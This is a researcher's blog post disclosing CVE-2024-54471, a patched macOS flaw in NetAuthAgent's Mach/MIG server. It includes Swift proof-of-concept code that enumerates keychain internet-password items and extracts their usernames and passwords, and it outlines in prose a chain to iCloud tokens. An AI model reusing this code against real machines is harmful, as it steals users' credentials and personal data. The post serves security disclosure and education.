<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://wts.dev/posts/password-leak/">Original</a>
    <h1>CVE-2024-54471: Leaking Passwords (and More!) on macOS</h1>
    
    <div id="readability-page-1" class="page"><article itemscope="" itemtype="http://schema.org/BlogPosting">
    <header>
      
      
      <img alt="A password prompt with the phrase &#39;No one can see this, right?&#39; in the name field. There is a checkbox to save the password to the macOS keychain." src="https://wts.dev/posts/password-leak/password-dialog.png" height="700"/>
    </header>
    <h2>Introduction</h2>
    <p>This article discusses a vulnerability, <b>CVE-2024-54471</b>, that was patched as part of the <a href="https://support.apple.com/en-us/100100">Apple security releases</a>: <b>macOS Sequoia 15.1, macOS Sonoma 14.7.1, and macOS Ventura 13.7.1</b> (all released on October 28th, 2024). If you use a macOS device and are not on one of these updated versions: <strong><em>update now!</em></strong></p>
    <p>This article is going to start with a lot of setup. I need to lay out some definitions and explain several concepts before jumping into the actual exploitation details. If you want, you can <a target="_self" href="#exploitation-time">skip to the juicy exploitation info.</a> For everyone else, thank&#39;s for coming along for the ride! Let me start by explaining inter-process communication on macOS.</p>
    <h2>What is a Kernel?</h2>
    <p>In an operating system, the code responsible for communicating with hardware and presenting a multi-tasking model to the applications (among many other things) is called the <b>kernel.</b> When code is executed in the kernel, it is said to be in <b>kernel space,</b> while code that is executed outside of the kernel (i.e. most applications) is said to be in <b>user space.</b> The separation between user space and kernel space is often an important security barrier.</p>
    <p>The kernel for macOS (and pretty much all Apple OS&#39;s) is known as <b><a href="https://github.com/apple-oss-distributions/xnu/tree/main">XNU.</a></b> XNU is a hybrid kernel, containing parts of the <abbr title="Berkeley Software Distribution">BSD</abbr> kernel and its variants, as well as a (now heavily-modified) variant of the Mach kernel. Interestingly, it appears that Apple is one of the only organizations out there that is still actively maintaining a Mach kernel variant. While the Free Software Foundation&#39;s GNU Hurd kernel is based on their own variant called GNU Mach, development on the GNU Hurd kernel project is very minimal today.</p>
    <h2>A (Not-So)-Brief History of Mach</h2>
    <p>The history of the Mach kernel is deeply entangled with <a href="https://en.wikipedia.org/wiki/Unix_wars">the Unix wars of the 80&#39;s and 90&#39;s,</a> with multiple organizations and groups working on it and using it, often in overlapping time periods. As such, there is not really a clean well-delineated timeline from the start of Mach to now. Additionally, certain historical notes don&#39;t have easily-found primary sources, but are repeated often enough in secondary and tertiary sources to be considered trustworthy. I have done my best to fact-check this section while also linking to primary sources (or as close as I could get) where important.</p>
    <p>Mach started life as <a href="https://www.cs.cmu.edu/afs/cs/project/mach/public/www/mach.html"><q>an operating systems research project of the Carnegie Mellon University School of Computer Science from 1985 to 1994.</q></a> In 1989, the Open Software Foundation (now The Open Group) announced it would be using Mach in their upcoming <a href="https://en.wikipedia.org/wiki/OSF/1">OSF/1 operating system.</a> Unfortunately, I have been unable to find a direct link to this announcement, but I did find a few sentences of coverage of the announcement in <a href="https://archive.org/details/st-report-120/page/n7/mode/2up">an archive of a late-December issue of a online magazine called <cite>CPU NewsWire Online MagazineÂ©</cite></a> (almost immediately after some coverage of late-1980&#39;s ransomware). The coverage of the announcement reads:</p>
    <blockquote>
      <pre><code>Cambridge, MA       The Open Systems Foundation, an organization funded by
-------------       several Unix vendors to develop a new Unix standard,
                    has announced that they may use the Mach OS (currently
                    used in the NeXT System) as the foundation for OSF/1,
                    their new systems software platform, instead of using
                    A/IX, IBM&#39;s version of Unix.

                    Mach provides better data security measures, inherent
                    support for multiprocessing, and compatibility with
                    Berkeley Unix.  But given that IBM&#39;s support of the
                    OSF was partly based on the OSF&#39;s use of A/IX, and
                    that much of the OSF&#39;s credibility depends on OSF/1
                    shipping by the announced date of July 1990....</code></pre>
    </blockquote>
    <p>It is unclear if the use of <q>Open Systems Foundation</q> is an error, or simply another name the OSF was known by at the time. I&#39;m also not sure why the last sentence ends the way that it does, as despite the ellipses, it does appear to be the end of the coverage. More pertinent to the current topic, though, is the reference to <q>the NeXT System.</q> This is likely referring to <a href="https://en.wikipedia.org/wiki/NeXTSTEP">NeXTSTEP,</a> the operating system from <a href="https://en.wikipedia.org/wiki/NeXT">NeXT</a> (the company that Steve Jobs founded after originally being ousted from Apple). This is the link that would ultimately bring Mach into what is now macOS.</p>
    <p>To say that NeXTSTEP simply used Mach would not tell the whole story. One of the original developers of Mach (and longtime friend of Steve Jobs) <a href="https://en.wikipedia.org/wiki/Avie_Tevanian">Avie Tevanian</a> worked with Steve as an executive at NeXT. When <a href="https://web.archive.org/web/19970301172356/http://live.apple.com/next/961220.pr.rel.next.html">NeXT was later acquired by Apple,</a><a></a> both Steve and Avie were given executive positions at their new parent company. Their NeXTSTEP operating system was developed into <a href="https://en.wikipedia.org/wiki/Darwin_(operating_system)">Darwin</a> the operating system basis for the next commercial release of Apple&#39;s Macintosh operating system: Mac OS X (now macOS).</p>
    <h2>Why Mach?</h2>
    <p>As mentioned previously, Mach was developed during the Unix wars of the 80&#39;s and 90&#39;s. Operating system vendors were all competing with each other to provide what they saw as the best way to design and use a Unix system. So what was it about Mach&#39;s Unix that was so special? What made it stand out amongst all the others? Really, it was the fact that <strong><em>it wasn&#39;t Unix</em></strong>... at least not <em>completely.</em></p>
    <p>In a paper submitted to the <cite><a href="https://archive.org/details/1986-proceedings-summer-tech-atlanta/page/93/mode/2up">USENIX 1986 Summer Technical Conference &amp; Exhibition</a></cite> (one of the earliest sources I could find), the developers laid out their vision and reasoning for creating Mach. They describe a landscape where inter-process communication had become frustratingly complex in Unix. What had started with the lowly file descriptor (a single handle that could allow a process to read, write, or seek) had turned into a confusing mess of streams, sockets, shared memory, and more. In an effort to simplify, they designed a system around Unix based on <em>four basic abstractions.</em></p>
    <h2>The Architecture of Mach</h2>
    <h3>The Four Abstractions</h3>
    <p>The four basic abstractions of Mach, as explain by the 1986 USENIX paper, are as follows (emphasis theirs):</p>
    <blockquote>
      <ol>
        <li>A <em>task</em> is an execution environment in which threads may run. It is the basic unit of resource allocation. A task includes a paged virtual address space and protected access to system resources (such as processors, port capabilities and virtual memory). The UNIX notion of a <em>process</em> is, in Mach, represented by a task with a single thread of control.</li>
        <li>A <em>thread</em> is the basic unit of CPU utilization. It is roughly equivalent to an independent program counter operating within a task. All threads within a task share access to all task resources.</li>
        <li>A <em>port</em> is a communication channel -- logically a queue for messages protected by the kernel. Ports are the reference objects of the Mach design. They are used in much the same way that object references could be used in an object oriented system. <em>Send</em> and <em>Receive</em> are the fundamental primitive operations on ports.</li>
        <li>A <em>message</em> is a typed collection of data objects used in communication between threads. Messages may be of any size and may contain pointers and typed capabilities for ports.</li>
      </ol>
    </blockquote>
    <p>Things certainly have changed in the several decades since this paper&#39;s release. For example, Mach threads actually pre-date <a href="https://en.wikipedia.org/wiki/Pthreads">POSIX threads</a> by nearly a decade (<a href="https://knight.sc/malware/2019/03/15/code-injection-on-macos.html#thread-injection">this fact has lead to difficulty when attempting shellcode injection on macOS</a>). However, despite decades of other software changes, these four abstractions still underpin what Mach is today in modern macOS (and all other XNU-based Apple OS&#39;s).</p>
    <h3>Tasks, Ports, and Port Rights</h3>
    <p>Ports in Mach are interesting as the queues themselves really only exist in kernel space. Ports are exposed to user space as integers, similar to file descriptors. Except <em>not really.</em> What is actually exposed are port <em>rights,</em> with each task having a <q>port name space</q> containing <em>named</em> port rights (the integers themselves being referred to as the <q>names</q> of these rights). In some cases, two <em>different</em> rights to the <em>same</em> port may have the same <q>name</q> and are thus exposed to the owning task in user space with the same integer.</p>
    <p>Despite all this, in what appears to be an effort to use similarly-named API&#39;s in both kernel space and user space, these <q>named port rights</q> are often referred to simply as <q>ports</q> in user space, despite that being technically incorrect. It can all be very confusing, and only really starts to make sense after practice and immersing one&#39;s self in the world of Mach.</p>
    <p>Regarding rights themselves, the two main types of rights are <b>send rights</b> and <b>receive rights</b>. The kernel will allow multiple tasks to hold a send right to a port, but will only allow a single task to hold a receive right. This essentially creates a <b>client-server model</b> with a single server task receiving messages from multiple client tasks. As alluded to by the Mach paper above, a task is basically synonymous with a process. However, there is one special task in Mach, the kernel itself (more on that later).</p>
    <h3>The Structure of a Message</h3>
    <p>Conceptually, each Mach message contains, in order:</p>
    <ol>
      <li>A header,</li>
      <li>an optional body of descriptors,</li>
      <li>an arbitrary payload of bytes, and</li>
      <li>a kernel-appended trailer (only on received messages).</li>
    </ol>
    <p>Descriptors allow tasks to share out-of-line memory and even port rights with each other, with the kernel mapping addresses and manipulating port name spaces as necessary. The data in the arbitrary payload, on the other hand, is transferred as-is from the sending task to the receiving task.</p>
    <h3>How Tasks Get Send Rights</h3>
    <p>One might wonder how a task gets send rights to start with. macOS includes a <b>bootstrap server,</b> a Mach task that holds the receive right to a port to which every task holds a send right. The bootstrap server exposes the concept of <b>Mach services,</b> which are Mach servers registered with the bootstrap port with specific string names. Clients can ask the bootstrap server for send rights to these Mach services by name.</p>
    <h2>The Mach Interface Generator (MIG)</h2>
    <h3>Introduction</h3>
    <p>While Mach messages seem simple on their face, in practice they can involve a lot of manual memory management, which can be prone to issues. Perhaps in an effort to combat this, the authors of Mach included <a href="https://www.cs.cmu.edu/afs/cs/project/mach/public/www/doc/abstracts/mig.html"><abbr title="Mach Interface Generator">MIG</abbr>,</a> which provides a way to create functional interfaces around the sending and receiving of Mach messages.</p>
    <p>MIG is two parts: a pseudo-C IDL (interface definition language) and a compiler that takes in an IDL file and outputs multiple C files:</p>
    <ul>
      <li>a C source file to run on clients,</li>
      <li>a C source file to run on the server, and</li>
      <li>a C header file to use for both.</li>
    </ul>
    <p>These files define functions that handle the messages for the clients and server, exposing an <abbr title="remote procedure call">RPC</abbr>-style interface wherein a client needs only to call a function on its end and a server needs only to implement that function on its end. This makes for a much more memory-safe messaging experience.</p>
    <h3>The Technical Details</h3>
    <p>On a technical level, MIG is really just a wrapper around Mach messages. Each function is referred to as a <b>routine,</b> with a collection of routines being referred to as a <b>subsystem.</b> Each subsystem has a <q>subsystem number</q> of off which the routines will be indexed. These indexes are included in the <q>message ID</q> field of the message header. For example, in a subsystem with the number 18000, messages meant for the second routine will have a message ID of 18001 (the routines are zero-indexed).</p>
    <p>MIG is actually used heavily by the kernel. Mach itself doesn&#39;t have many system calls (specifically where a special CPU instruction is called and the kernel does something different based on a number in some register). The call to send or receive a message is, itself, a system call. However, many kernel API&#39;s you might think are system calls are merely MIG functions that send Mach messages to the kernel, which will perform the requested operation and return the result in a reply message.</p>
    <p>For communication across user space, MIG has been largely superseded by <a href="https://developer.apple.com/documentation/xpc">Apple&#39;s own XPC API&#39;s.</a> XPC (and really most IPC mechanisms on macOS) are also built on top of Mach messages, as they are the fundamental unit of inter-process communication in the Mach kernel. However, the XPC API&#39;s are much more developer-friendly than MIG. It&#39;s actually unclear if Apple ever truly supported third-party developers using MIG, as there does not appear to be any documentation from them on how to use it. However, they still do maintain <a href="https://github.com/apple-oss-distributions/bootstrap_cmds">their own version,</a> and there are a few legacy MIG servers still around.</p>
    <p>For those who are curious about the different IPC mechanisms in macOS, I highly recommend <a href="https://www.youtube.com/watch?v=D1jNCy7-g9k">Ian Beer&#39;s fantastic talk on the topic.</a> The video itself is nearly a decade old at this point, and many of the specific attack vectors he talks about (specifically those around memory manipulation) may not be entirely applicable today. However, it is still a very comprehensive look into the many different API&#39;s that processes have at their disposal on macOS to communicate with each other. Anyway, back to MIG!</p>
    <h2>Exploiting MIG Servers</h2>
    <h3>On the Security of MIG Servers</h3>
    <p>You might notice the lack of security measures native to MIG. What is to stop a task from getting a send right to a MIG server and sending it the same messages that the MIG-compiled client code would, ultimately calling the remote routines on the server? There are ways a MIG server can verify the sender of a message. But if it neglects to do so, <strong><em>any task with a send right can call routines on the MIG server.</em></strong></p>
    <h3>Finding MIG Servers</h3>
    <p>But how would you find MIG servers to exploit? This is where <a href="https://github.com/blacktop/ipsw">the <code>ipsw</code> <abbr title="command-line interface">CLI</abbr> tool from blacktop</a> comes in very handy. The code that MIG compiles, almost as a rule, uses the specific symbol <a><code>NDR_record</code></a> as the first field of every payload. It appears this symbol is meant to convey information on how certain primitives (such as characters and integers) are represented on the sending task.</p>
    <p>The interesting thing about this is that I&#39;ve <em>never</em> come across a MIG server that actually uses that field of the payload when parsing received messages. In spite of this, <code>NDR_record</code> is still used in essentially all messages. Since it is an external symbol, this makes it easy to find binaries that use it. The <code>ipsw</code> CLI includes a subcommand that, when pointed to a <code>.ipsw</code> file (an update package for Apple OS&#39;s), you can search for binaries that import a specific symbol. To find binaries that use the <code>NDR_record</code> symbol, you can run:</p>
    <pre><code>ipsw macho search /path/to/update.ipsw -m &#34;NDR_record&#34;</code></pre>
    <p>An important thing to note is that this will find both MIG servers and <em>MIG clients</em> (some binaries are even both a MIG client and a MIG server). However, it is fairly easy to tell the difference between client and server code once a binary is opened in a disassembler or decompiler. I may publish a more specific follow-up article detailing how to reverse MIG servers.</p>
    <h2 id="exploitation-time">Exploitation Time!</h2>
    <h3>Introducing NetAuthAgent</h3>
    <p><b>NetAuthAgent</b> is a daemon on macOS (more specifically a <q>user agent,</q> as <a href="https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html">the OS documentation delineates between the two terms</a>) that is responsible for handling the credentials for file servers (FTP, Samba, WebDAV, etc.). Before this vulnerability was patched, you could send a message to NetAuthAgent asking for the credentials to any server, and it would just <strong><em>give them to you.</em></strong></p>
    <h3>How NetAuthAgent Works</h3>
    <p>When <a href="https://support.apple.com/guide/mac-help/connect-mac-shared-computers-servers-mchlp1140/mac">accessing a file sever through Go -&gt; Connect To Server in Finder</a> a dialog box like the one below might appear. This dialog is actually coming from NetAuthAgent (or perhaps a sibling process of NetAuthAgent). If the user opts to check the box to remember the password, the credentials are stored in the macOS <b>keychain.</b></p>
    <img alt="A password prompt with the phrase &#39;No one can see this, right?&#39; in the name field. There is a checkbox to save the password to the macOS keychain." src="https://wts.dev/posts/password-leak/password-dialog.png" height="700"/>
    <h4>The macOS Keychain</h4>
    <p>It&#39;s important to understand that NetAuthAgent itself did not (and does not) store the credentials directly. The macOS keychain is essentially a central secrets manager. NetAuthAgent uses this centralized location to store the credentials. Apple seems to downplay the importance of the keychain, with <a href="https://support.apple.com/guide/keychain-access/what-is-keychain-access-kyca1083/mac">the documentation for their GUI Keychain Access app</a> describing it as merely a way to <q>manage certificates.</q> The OS will also attempt to direct users to the Passwords app when users open the Keychain Access app:</p>
    <img alt="A dialog box titled &#39;Manage Your Passwords in the New Passwords App&#39; that reads &#39;Use the Passwords app to manage your passwords and passkeys, set up verification codes, and view security recommendations to keep your accounts safe.&#39; The primary action button reads &#39;Open Passwords&#39; and the secondary action button reads &#39;Open Keychain Access&#39;. A check box allows the user to tell the OS &#39;Do not show this message again.&#39;" src="https://wts.dev/posts/password-leak/passwords-popup.png" height="800"/>
    <p>In reality, the keychain is much more than Apple would suggest. Many applications, including NetAuthAgent, use it to store secrets. It&#39;s a fairly well-designed system, with each keychain item having its own access control list. This generally blocks applications from accessing secrets they should not have access to. However, if a process were to expose a mechanism for other processes to essentially proxy keychain queries through it, that can undermine the security of the whole system.</p>
    <h4>NetAuthAgent&#39;s MIG Server</h4>
    <p>NetAuthAgent exposes a MIG server available to lookup from the bootstrap server under the name <code>com.apple.netauth.user.gui</code>. The server exposed routines to read, create, and even overwrite in some cases, file server credentials. None of the routines ever verified message senders before this patch.</p>
    <h3>Exploiting NetAuthAgent</h3>
    <h4>On Kass</h4>
    <p>While exploring the internals of XNU, I decided to develop <a href="https://github.com/nmggithub/Kass">Kass,</a> a security research tool written in Swift, to help me have a better time dealing with Mach messages. Kass has since expanded to cover much more than Mach messages, covering many more Mach API&#39;s in XNU as well as several of its BSD-layer kernel API&#39;s.</p>
    <p>The proof-of-concept code I am including here will be written with the help of this tooling. Most of the code will be presented with minimal comment, as if I had to explain all the intricacies of how Kass works, in addition to Swift syntax, this article would be much longer than it already is! If you&#39;re curious about how to use Kass, I encourage you to take a look through <a href="https://swiftpackageindex.com/nmggithub/Kass/v4.2.1/documentation/machcore">my documentation.</a></p>
    <h4>Building a MIG Client</h4>
    <p>
      Kass provides an easy way to define a MIG client with a service name and subsystem number (the <code>baseRoutineID</code> argument) like so:
    </p>
    <pre><code>class NetAuthAgentClient: Mach.MIGClient, Mach.PortInitializableByServiceName {
    convenience init() throws {
        try self.init(serviceName: &#34;com.apple.netauth.user.gui&#34;, baseRoutineID: 40200)
    }

  ...
}</code></pre>
    <h4>Writing a Client Routine Handler</h4>
    <p>Keychain items on macOS have a metadata field that says what <q>class</q> an item is of. Routine 19 (message ID 40219) of NetAuthAgent allows clients to essentially proxy keychain queries for items with a class of <q><a href="https://developer.apple.com/documentation/security/ksecclassinternetpassword">internet password.</a></q> This is the class that NetAuthAgent uses for most file server credentials. The routine takes in an out-of-line data descriptor containing a serialized dictionary of arguments, and returns two out-of-line data descriptors containing the username and password.</p>
    <p>
      Note that the routine expects the size of the data in the descriptor to be sent along in the payload (even though the descriptor itself includes the size). This is because that is what the MIG-compiled client code does for this routine, so this code needs to emulate that behavior.
    </p>
    <pre><code>...

    func getInternetPassword(
        scheme: String? = nil, host: String, port: Int? = nil, path: String? = nil,
        username: String? = nil
    ) throws -&gt; (username: String, password: String) {
        struct InternetPasswordPayload: Mach.TrivialMessagePayload, Mach.MIGPayloadWithNDR {
            let NDR: NDR_record_t = NDR_record_t()
            let size: mach_msg_size_t
        }
        let plistData = self.serializeInternetPasswordOptions(
            scheme: scheme, host: host, port: port, path: path
        )
        let reply = try self.doRoutine(
            19,
            request: Mach.MIGRequest(
                descriptors: [
                    mach_msg_ool_descriptor_t(data: plistData)
                ],
                payload: InternetPasswordPayload(size: mach_msg_size_t(plistData.count))
            )
        )
        let username = String(
            data: (reply.body!.descriptors[0] as! mach_msg_ool_descriptor_t).data ?? Data(),
            encoding: .utf8
        )!
        let password = String(
            data: (reply.body!.descriptors[1] as! mach_msg_ool_descriptor_t).data ?? Data(),
            encoding: .utf8
        )!
        return (username, password)
    }

    ...</code></pre>
    <p>The code above calls <code>serializeInternetPasswordOptions</code> to serialize a dictionary so it can be sent in an out-of-line data descriptor. Below is the implementation for that helper function:</p>
    <pre><code>...

    private func serializeInternetPasswordOptions(
        scheme: String? = nil, host: String, port: Int? = nil, path: String? = nil
    ) -&gt; Data {
        var options: [String: Any] = [:]
        if let scheme = scheme { options[&#34;Scheme&#34;] = scheme }
        options[&#34;Host&#34;] = host
        if let port = port { options[&#34;AlternatePort&#34;] = port }
        if let path = path { options[&#34;Path&#34;] = path }
        return try! PropertyListSerialization.data(
            fromPropertyList: options, format: .binary, options: 0
        )
    }

    ...</code></pre>
    <h4>Finding Credentials To Query</h4>
    <p>The macOS keychain provides <a href="https://developer.apple.com/documentation/security/secitemcopymatching(_:_:)">API&#39;s to query for keychain items,</a> and these are what NetAuthAgent uses internally. Interestingly, these API&#39;s can often be used by unprivileged processes to get the <em>metadata</em> about keychain items, as long as they are not asking for the secret values themselves. The below defines a variable <code>netAuthAgentInternetPasswords</code> that will contain an array of keychain items that NetAuthAgent should be able to access.</p>
    <pre><code>var netAuthAgentInternetPasswords: [[CFString: Any]] {
    var cfItems: CFTypeRef?
    let copyMatchingStatus = SecItemCopyMatching(
        [
            kSecClass: kSecClassInternetPassword,
            kSecReturnAttributes: true,
            kSecMatchLimit: kSecMatchLimitAll,
            kSecReturnRef: true,
        ] as CFDictionary,
        &amp;cfItems
    )
    guard let items = cfItems as? [[CFString: Any]], copyMatchingStatus == errSecSuccess
    else { return [] }
    return items.compactMap {
        item in
        guard let keychainItem = item[kSecValueRef as CFString] as! SecKeychainItem?
        else { return nil }
        guard canNetAuthAgentAccess(keychainItem: keychainItem) else { return nil }
        return item
    }
}</code></pre>
    <p>The access control list is among the metadata that is accessible without privilege, allowing for this code to check if NetAuthAgent is in the list of trusted applications.</p>
    <pre><code>func canNetAuthAgentAccess(keychainItem: SecKeychainItem) -&gt; Bool {
    var access: SecAccess?
    let copyAccessStatus = SecKeychainItemCopyAccess(keychainItem, &amp;access)
    guard let access = access, copyAccessStatus == errSecSuccess else { return false }
    var aclList = CFArrayCreateMutable(nil, 0, nil) as CFArray?
    let copyACLStatus = SecAccessCopyACLList(access, &amp;aclList)
    guard let aclList = aclList, copyACLStatus == errSecSuccess else { return false }
    let acls = aclList as! [SecACL]
    for acl in acls {
        var applicationList = CFArrayCreateMutable(nil, 0, nil) as CFArray?
        var description: CFString?
        var promptSelector: SecKeychainPromptSelector = .init()
        let copyContentsStatus = SecACLCopyContents(
            acl, &amp;applicationList, &amp;description, &amp;promptSelector
        )
        guard let applicationList = applicationList, copyContentsStatus == errSecSuccess else {
            continue
        }
        let applications = applicationList as! [SecTrustedApplication]
        for application in applications {
            var data: CFData? = CFDataCreateMutable(nil, 0)
            let copyRequirementStatus = SecTrustedApplicationCopyData(application, &amp;data)
            guard let data = data as? Data, copyRequirementStatus == errSecSuccess else {
                continue
            }
            let app = String(data: data, encoding: .utf8)
            if app?.contains(&#34;/System/Library/CoreServices/NetAuthAgent.app&#34;) == true {
                return true
            }
        }
    }
    return false
}</code></pre>
    <p>
      These credentials can then be iterated over in a simple loop like so:
    </p>
    <pre><code>for item in netAuthAgentInternetPasswords {
    let protocolType = item[kSecAttrProtocol as CFString] as! CFString
    let host = item[kSecAttrServer as CFString] as! String
    let port = item[kSecAttrPort as CFString] as? Int
    let path = item[kSecAttrPath as CFString] as? String
    let username = item[kSecAttrAccount as CFString] as? String
    let displayName = item[kSecAttrLabel as CFString] as! String
    print(&#34;Item:&#34;)
    print(&#34;\tDisplay Name: \(displayName)&#34;)
    print(&#34;\tProtocol: \(protocolType)&#34;)
    print(&#34;\tHost: \(host)&#34;)
    if let port = port { print(&#34;\tPort: \(port)&#34;) }
    if let path = path { print(&#34;\tPath: \(path)&#34;) }
    if let username = username { print(&#34;\tUsername: \(username)&#34;) }
    let credentials = try NetAuthAgentClient().getInternetPassword(
        host: host, port: port, path: path, username: username
    )
    print(&#34;Credentials:&#34;)
    print(&#34;\tUsername: \(credentials.username)&#34;)
    print(&#34;\tPassword: \(credentials.password)&#34;)
}</code></pre>
    <h3>This is bad.</h3>
    <p>This is obviously a pretty bad situation. Before this vulnerability was patched, a malicious process with the ability to get a send right to NetAuthAgent could then leak all the file server credentials. This is especially dangerous as, in corporate environments, these could be <a href="https://en.wikipedia.org/wiki/Single_sign-on"><abbr title="Single sign-on">SSO</abbr> credentials,</a> potentially giving an attacker access to multiple other resources within the corporate system.</p>
    <p>While it is basically impossible to know how many companies are using the <q>Connect to Server</q> feature in Finder to connect ot their file servers (instead of using alternate third-party) clients, it is possible to see <em>other</em> organizations that are likely using it. When doing research for this vulnerability, I found multiple colleges and universities with help articles directing students and faculty to use this feature, with many explicitly telling users to check the box saving the credentials to the keychain.</p>
    <p>One article of note was a print server vendor&#39;s instructions on connecting to printers (yes NetAuthAgent handles printer server credentials too). I did also find at least one article instructing users <em>not</em> to check the box, as Apple&#39;s Keychain Access app would be too unwieldy for a general user to use if they needed to update the saved password.</p>
    <p>Additionally, while I was unable to confirm it, this could also potentially lead to a privilege escalation attack if those credentials could also be used as superuser credentials on a managed device. It&#39;s fairly trivial to <a href="https://gist.github.com/nmggithub/779563215439beb36692957900d9ec1e">silently escalate to root on macOS, if the credentials for an administrative user are known.</a> I did not have a managed device to test with, so I cannot confirm this. However, I recall when I did use a MacBook provided by my employer, I signed into it using my SSO credentials.</p>
    <p>It&#39;s also important to understand how this affects individual users as well. If a user has their own <abbr title="network-attached storage">NAS</abbr> and connected to it via Finder (and opted to save the credentials), this vulnerability would expose those credentials to attackers. If that user also reused those credentials for other internet accounts, an attacker could compromise those other accounts as well.</p>
    <p>And of course, barring any additional security checks, this vulnerability allows an attacker to access the files on the server. These files could be literally anything: from a users personal documents to a company&#39;s highly sensitive trade secrets. Given that FTP, Samba, and WebDAV all have well-defined interfaces, discovery and exfiltration of files can easily be automated after the credentials are leaked.</p>
    <p>Another, less likely, use of this vulnerability is as a covert data-hiding method for other malicious processes. As NetAuthAgent exposed routines to <em>create</em> keychain items, a particularly crafty malicious process could delegate it to create specific items, stuffing arbitrary data into the <q>password</q> field. When that process needs the data again, it can ask NetAuthAgent to supply it. This avoids writing to disk, which might trigger security software. I&#39;m unaware of any security software that explicitly checks the keychain for suspicious entries. And who would manually check their keychain for such things?</p>
    <p>As a final note, this vulnerability did open up the possibility of a malicious process saving legitimate credentials to the keychain. While this probably wouldn&#39;t do anything on it&#39;s own, it could be used in a more complex attack where an attacker saves credentials to a file server they control and then social engineers the user into entering the address into the <q>Connect to Server</q> dialog, or similar. How that could progress to a compromise, I am unsure. But it is a possibility.</p>
    <h2>An Exploit Chain</h2>
    <h3>Introduction</h3>
    <p>One might think that if they don&#39;t use the <q>Connect to Server</q> option in Finder, that they have nothing to worry about in regards to this vulnerability. <strong><em>They would be wrong.</em></strong> This vulnerability also exposed an exploit chain that allowed attackers access to much more than what has been mentioned above.</p>
    <h3>The Keychain Item</h3>
    <p>Remember how each keychain item has its own access control list? And remember how all NetAuthAgent is doing is proxying keychain requests? It would be <em>really</em> bad if there was a keychain item, that didn&#39;t have anything to do with file servers, that had an open enough <abbr title="access control list">ACL</abbr> to where NetAuthAgent could access it.</p>
    <p>It turns out: there is such an item. On basically every macOS device, there is a keychain item that containsâ¦</p>
    <ul>
      <li>â¦a decryption keyâ¦</li>
      <li>â¦for a file on-disk that containsâ¦</li>
      <li><strong><em>â¦iCloud account information and API tokens.</em></strong></li>
    </ul>
    <h3>What&#39;s in The File?</h3>
    <p>Taking the keychain item and the file (which is at a known location on-disk), an attacker can decrypt the file and gain access to a wealth of information on the iCloud account of the device&#39;s user:</p>
    <ul>
      <li>first and last name,</li>
      <li>email address,</li>
      <li>email aliases,</li>
      <li>enabled features and their endpoints,</li>
      <li>multiple long-lasting API tokens, etc.</li>
    </ul>
    <p>This is personal information that I would assume the average user would not want to be exposed in this way. The more dangerous part, though, is the exposure of the API keys. What could an attacker use this for?</p>
    <h3>Using the API Tokens</h3>
    <h4>Previous Work</h4>
    <p>At this point, I am indebted to <a href="https://wojciechregula.blog/post/bypass-tcc-via-icloud/">the work of <span lang="pl">Wojciech ReguÅa</span>,</a> a Polish security researcher and <a href="https://www.securing.pl/en/author/wojciechregula/">head of mobile security at Securing.</a> He was able to find these API tokens, albeit through a different method, several years ago. He used the tokens to leak out the user&#39;s:</p>
    <ul>
      <li>Contacts,</li>
      <li>Calendars,</li>
      <li>Reminders, and</li>
      <li>even <strong><em>their location through Find My.</em></strong></li>
    </ul>
    <p>I was able to replicate <em>all of this</em>, save for Reminders on newer and migrated accounts as Apple has recently migrated them to the more-secure CloudKit (where they are only accessible in their encrypted form). It&#39;s likely that Contacts and Calendars were not given this treatment in an effort to allow for easier integration with third-party software. Tangentially, the Find My network likely doesn&#39;t have much additional security around it to better enable smooth operation of the network itself.</p>
    <h4>My Additions</h4>
    <p>I was able to take Wojciech&#39;s work and expand upon it, adding the ability to:</p>
    <ul>
      <li>leak contact photos,</li>
      <li>query (but not decrypt) CloudKit,</li>
      <li>leak data from the <a href="https://developer.apple.com/documentation/foundation/nsubiquitouskeyvaluestore">iCloud key-value store,</a></li>
      <li>leak metadata about iCloud backups (including device serial numbers),</li>
      <li><strong><em>leak the locations of the user&#39;s other devices through Find My,</em></strong></li>
      <li><strong><em>leak the locations of the user&#39;s friends through Find My,</em></strong></li>
      <li>and even perform lock, erase, and <q>play sound</q> operations through Find My.</li>
    </ul>
    <p>I did try to investigate what would be needed to decrypt CloudKit data, and I did get pretty close (at least, I believe I was close), but I was unable to finish and ultimately gave up. However, I would not be surprised if it is within the capabilities of some commercial forensics companies out there to use these API tokens (along with the PIN for an iOS device, if necessary) to decrypt CloudKit data, either directly from CloudKit or (more likely) from the user&#39;s iCloud backups.</p>
    <h3>This is <em>really</em> bad.</h3>
    <p>This is now obviously a very bad situation. Not only did this vulnerability expose file server credentials (and all the mess that causes), but it also exposed iCloud API tokens, opening up even more avenues of attack (potentially more than I have even speculated on in this article). And all of this stemmed from one daemon not verifying the senders of messages it received. But wait a minute. How <em>should</em> a daemon do that?</p>
    <h2>What Should Apple Have Done?</h2>
    <p>I am now going to say the one word that a bunch of readers have probably been screaming in their heads for the past while: <b><a href="https://developer.apple.com/documentation/bundleresources/entitlements">entitlements.</a></b> Entitlements, on their own, are simply key-value pairs attached to a binary at code-signing time. At the lowest level (i.e. <a href="https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html#//apple_ref/doc/uid/TP40005929-CH4-SW13">when using the <code>codesign</code> CLI directly</a>), a binary can be signed with any arbitrary entitlements.</p>
    <p>However, in every macOS device in the standard security configuration, there is a kernel module called Apple Mobile File Integrity that will scan every process that launches and will immediately kill processes that have <q>restricted entitlements</q> that they don&#39;t have a proper <b>provisioning profile</b> for. Provisioning profiles have to be signed by Apple, so it&#39;s very difficult to get past this check.</p>
    <p>This results in a system where the processes that are running should only have entitlements that were allowed by <abbr title="Apple Mobile File Integrity">AMFI</abbr>. Thus, if you were to check the entitlements of a process, they would serve as a good metric of what the process is entitled (hence the name) to do. This is ultimately what NetAuthAgent should have done, and what it does now. When it receives a message, it first checks the entitlements of the sender. If the sender does not have the entitlements key <code>com.apple.private.netauth.useragent.allow</code> with a boolean value of <code>true</code>, it refuses to respond to the message. This effectively blocks any exploitation of NetAuthAgent&#39;s MIG routines.</p>
